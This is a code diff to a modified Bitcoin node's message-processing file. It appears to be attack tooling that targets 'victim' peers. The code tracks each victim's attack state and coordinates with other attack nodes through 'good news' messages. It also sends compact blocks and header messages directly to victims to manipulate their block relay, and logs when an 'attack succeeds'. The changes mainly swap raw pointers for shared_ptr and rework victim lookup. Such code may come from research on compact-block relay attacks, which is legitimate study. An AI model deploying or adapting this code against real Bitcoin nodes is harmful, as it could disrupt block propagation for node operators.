@@ -1062,7 +1062,12 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
     {
         LOCK(cs_main);
         if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
-            LogPrintf("attack succeeds at block %s for victim %s!\n", inv.hash.ToString(), pfrom->addr.ToString());
+            std::shared_ptr<VictimState> pvictimState = connman->victim_states[pfrom->addr.ToString()];
+            if (pvictimState->attack_state == 1) {
+                LogPrintf("VIC %s - attack succeeds at block %s!\n", pfrom->addr.ToString(), inv.hash.ToString());
+            } else {
+                LogPrintf("VIC %s - weird block requested %s!\n", pfrom->addr.ToString(), inv.hash.ToString());
+            }
         }
         BlockMap::iterator mi = mapBlockIndex.find(inv.hash);
         if (mi != mapBlockIndex.end())
@@ -1095,7 +1100,7 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
              * following boolean to 1. Later when we receive the new block, we can process accordingly.
              */
             if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
-                VictimState* pvictimState = connman->victim_states[pfrom->addr.ToString()];
+                std::shared_ptr<VictimState> pvictimState = connman->victim_states[pfrom->addr.ToString()];
                 pvictimState->getdata_request.insert(inv.hash.ToString());
             }
         }
@@ -1785,14 +1790,14 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
         int good_news = 0;
         std::string victim_ip;
         vRecv >> good_news >> victim_ip;
-        LogPrintf("received good news %s from peer %s about victim %s!\n", good_news, pfrom->addr.ToString(), victim_ip);
+        LogPrintf("VIC %s - received good news %s from peer %s\n", victim_ip, good_news, pfrom->addr.ToString());
 
         if (connman->victim_states.find(victim_ip) == connman->victim_states.end()) {
-            VictimState *pvState = new VictimState();
+            std::shared_ptr<VictimState> pvState = std::make_shared<VictimState>();
             connman->victim_states[victim_ip] = pvState;
         }
 
-        VictimState* pvictimState = connman->victim_states[victim_ip];
+        std::shared_ptr<VictimState> pvictimState = connman->victim_states[victim_ip];
 
         //bool fsendcompact_update = false;
         //uint64_t block_version_update = 1;
@@ -1924,7 +1929,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
              * customized code to handle victim's sendcmpct message
              */
             if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
-                VictimState* pvictimState = connman->victim_states[pfrom->addr.ToString()];
+                std::shared_ptr<VictimState> pvictimState = connman->victim_states[pfrom->addr.ToString()];
                 /*
                  * TODO: remove the hard code of the IP address of other attack nodes.
                  */
@@ -1940,7 +1945,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 int good_news = 0;
                 std::string victim_ip = pfrom->addr.ToString();
                 if (fAnnounceUsingCMPCTBLOCK) {
-                    LogPrintf("received good news 1 for myself from victim %s\n", pfrom->addr.ToString());
+                    LogPrintf("VIC %s - received good news 1 for myself\n", pfrom->addr.ToString());
                     good_news = 1;
                     // add myself to the hb list
                     pvictimState->hb_list.insert(-1);
@@ -1966,7 +1971,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                     /*
                      * take actions only when the node is removed from the HBN list
                      */
-                    LogPrintf("received good news 0 from myself\n");
+                    LogPrintf("VIC %s - received good news 0 for myself\n", pfrom->addr.ToString());
                     pvictimState->hb_list.erase(-1);
                     /*
                     if (pvictimState->attack_state == 1) {
@@ -2173,8 +2178,8 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                  */
                 CDataStream blocktxn_req_stream(SER_DISK, PROTOCOL_VERSION);
                 blocktxn_req_stream << req;
-                BlockTransactionsRequest *copy_req = new BlockTransactionsRequest();
-                blocktxn_req_stream >> (*copy_req);
+                std::shared_ptr<BlockTransactionsRequest> copy_req = std::make_shared<BlockTransactionsRequest>();
+                blocktxn_req_stream >> *copy_req;
 
                 LogPrint(BCLog::NET, "copied request: %d\n", copy_req->indexes.size());
                 connman->victim_states[pfrom->addr.ToString()]->relayed_compact_blocks[req.blockhash.ToString()] = copy_req;
@@ -2465,31 +2470,42 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
          * Iterate through all victims and take actions for each victim depending on its attack state.
          */
         for (auto victim_it : connman->victim_states) {
-            VictimState* pvictimState = victim_it.second;
-            CNode* pvictim = pvictimState->pvictim;
+            std::shared_ptr<VictimState> pvictimState = victim_it.second;
 
-            if (pvictim
-                && pvictimState->attack_state == 0
+            std::string victim_ip_string = victim_it.first.substr(0, victim_it.first.find(":"));
+            struct in_addr victim_in_addr = { .s_addr = inet_addr(victim_ip_string.c_str()) };
+            CNode* pvictim = connman->FindNode((CNetAddr)victim_in_addr);
+
+            if (pvictimState->attack_state == 0
                 && pvictimState->relayed_compact_blocks.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_compact_blocks.end()) {
-                connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
-                pvictimState->relayed_compact_blocks[cmpctblock.header.GetHash().ToString()] = NULL;
-                LogPrintf("***Sending a new compact block %s directly to the victim***\n", cmpctblock.header.GetHash().ToString() );
-            } else if (pvictim
-                       && pvictimState->attack_state == 1
+                if (pvictim) {
+                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
+                    pvictimState->relayed_compact_blocks[cmpctblock.header.GetHash().ToString()] = nullptr;
+                    pvictimState->relayed_fast_headers[cmpctblock.header.GetHash().ToString()] = 0;
+                    LogPrintf("VIC %s - sending a new compact block %s directly\n", pvictim->addr.ToString(),
+                              cmpctblock.header.GetHash().ToString());
+                }
+            } else if (pvictimState->attack_state == 1
                        && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) != pvictimState->getdata_request.end()) {
-                connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
-                LogPrintf("***Sending a compact block to the victim to respond to its previous getdata request***\n");
-                pvictimState->getdata_request.erase(cmpctblock.header.GetHash().ToString());
-            } else if (pvictim
-                       && pvictimState->attack_state == 1
+                if (pvictim) {
+                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
+                    LogPrintf("VIC %s - sending a compact block to respond to its previous getdata request\n",
+                              pvictim->addr.ToString());
+                    pvictimState->getdata_request.erase(cmpctblock.header.GetHash().ToString());
+                }
+            } else if (pvictimState->attack_state == 1
                        && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) == pvictimState->getdata_request.end()
                        && pvictimState->relayed_fast_headers.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_fast_headers.end()) {
-                // construct a headers message and send directly to the victim
-                std::vector<CBlock> headers_to_victim;
-                headers_to_victim.push_back(cmpctblock.header);
-                connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::HEADERS, headers_to_victim));
-                pvictimState->relayed_fast_headers[cmpctblock.header.GetHash().ToString()] = 0;
-                LogPrintf("***Sending a headers message (constructed from a compact block) %s directly to victim***\n", cmpctblock.header.GetHash().ToString());
+                if (pvictim) {
+                    // construct a headers message and send directly to the victim
+                    std::vector <CBlock> headers_to_victim;
+                    headers_to_victim.push_back(cmpctblock.header);
+                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::HEADERS, headers_to_victim));
+                    pvictimState->relayed_fast_headers[cmpctblock.header.GetHash().ToString()] = 0;
+                    pvictimState->relayed_compact_blocks[cmpctblock.header.GetHash().ToString()] = nullptr;
+                    LogPrintf("VIC %s - sending a headers message (constructed from a compact block) %s directly\n",
+                              pvictim->addr.ToString(), cmpctblock.header.GetHash().ToString());
+                }
             }
         }
 
@@ -2802,12 +2818,15 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                  * check if we need to respond to possible pending getblocktxn request from the victim
                  */
                 for (auto victim_it : connman->victim_states) {
-                    VictimState* pvictimState = victim_it.second;
+                    std::shared_ptr<VictimState> pvictimState = victim_it.second;
                     auto my_it = pvictimState->relayed_compact_blocks.find(resp.blockhash.ToString());
-                    if ((my_it != pvictimState->relayed_compact_blocks.end()) && (my_it->second != NULL)) {
-                        BlockTransactionsRequest *victim_req = my_it->second;
+                    if ((my_it != pvictimState->relayed_compact_blocks.end()) && (my_it->second != nullptr)) {
+                        std::shared_ptr<BlockTransactionsRequest> victim_req = my_it->second;
                         LogPrint(BCLog::NET, "victim blocktxn request missing: %d transactions\n", victim_req->indexes.size());
-                        CNode* pvictim = pvictimState->pvictim;
+
+                        std::string victim_ip_string = victim_it.first.substr(0, victim_it.first.find(":"));
+                        struct in_addr victim_in_addr = { .s_addr = inet_addr(victim_ip_string.c_str()) };
+                        CNode* pvictim = connman->FindNode((CNetAddr)victim_in_addr);
                         if (pvictim) {
                             std::shared_ptr<const CBlock> recent_block;
                             {
@@ -2854,17 +2873,20 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
         }
 
         for (auto victim_it : connman->victim_states) {
-            VictimState* pvictimState = victim_it.second;
-            CNode* pvictim = pvictimState->pvictim;
+            std::shared_ptr<VictimState> pvictimState = victim_it.second;
+            std::string victim_ip_string = victim_it.first.substr(0, victim_it.first.find(":"));
+            struct in_addr victim_in_addr = { .s_addr = inet_addr(victim_ip_string.c_str()) };
+            CNode* pvictim = connman->FindNode((CNetAddr)victim_in_addr);
 
-            if (pvictim
-                && pvictimState->attack_state == 1
+            if (pvictimState->attack_state == 1
                 && headers.size() == 1
                 && pvictimState->relayed_fast_headers.find(headers[0].GetHash().ToString()) == pvictimState->relayed_fast_headers.end()) {
-                headers_to_victim.push_back(headers[0]);
-                connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::HEADERS, headers_to_victim));
-                pvictimState->relayed_fast_headers[headers[0].GetHash().ToString()] = 0;
-                LogPrintf("***Sending a headers message directly to victim***\n");
+                if (pvictim) {
+                    headers_to_victim.push_back(headers[0]);
+                    connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::HEADERS, headers_to_victim));
+                    pvictimState->relayed_fast_headers[headers[0].GetHash().ToString()] = 0;
+                    LogPrintf("VIC %s - sending a headers message directly\n", pvictim->addr.ToString());
+                }
             }
         }
 
